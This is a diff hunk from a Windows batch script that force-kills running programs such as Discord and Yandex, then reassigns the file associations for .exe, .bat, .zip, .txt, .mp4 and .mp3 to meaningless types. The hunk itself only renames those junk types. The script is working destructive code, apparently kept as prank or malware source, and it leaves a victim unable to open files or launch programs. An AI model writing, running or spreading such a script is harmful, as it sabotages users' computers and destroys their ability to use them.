@@ -31,11 +31,11 @@ taskkill /f /im mrsmjrgui.exe
 taskkill /f /im yandex.exe
 taskkill /f /im discord.exe
 assoc .zip=error.sss
-assoc .exe=error.sss
-assoc .txt=error.sss
-assoc .mp4=error.sss
-assoc .mp3=error.sss
-assoc .bat=error.sss
+assoc .exe=erroa.ssa
+assoc .txt=errow.ssw
+assoc .mp4=erroe.sse
+assoc .mp3=erroq.ssq
+assoc .bat=errog.ssg
 start error
 
 exit
